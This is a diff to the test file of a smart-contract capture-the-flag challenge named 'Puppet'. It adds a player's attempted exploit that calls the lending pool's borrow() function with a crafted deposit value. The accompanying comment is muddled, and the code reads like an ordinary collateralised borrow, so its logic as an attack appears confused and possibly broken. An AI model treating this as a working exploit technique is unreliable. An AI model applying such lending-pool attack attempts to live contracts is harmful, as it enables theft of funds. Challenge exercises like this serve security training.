@@ -95,6 +95,11 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // @notes perform borrow() call for msg.value == pool balance, with msg.value set at 2 * amount, so that msg.value == depositRequired(), and no assets are transferred into the pool because of no == msg.value resolve.
+        await lendingPool.connect(player).borrow(
+            lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE) / 2, 
+            player.address, 
+            { value: lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)});
     });
 
     after(async function () {
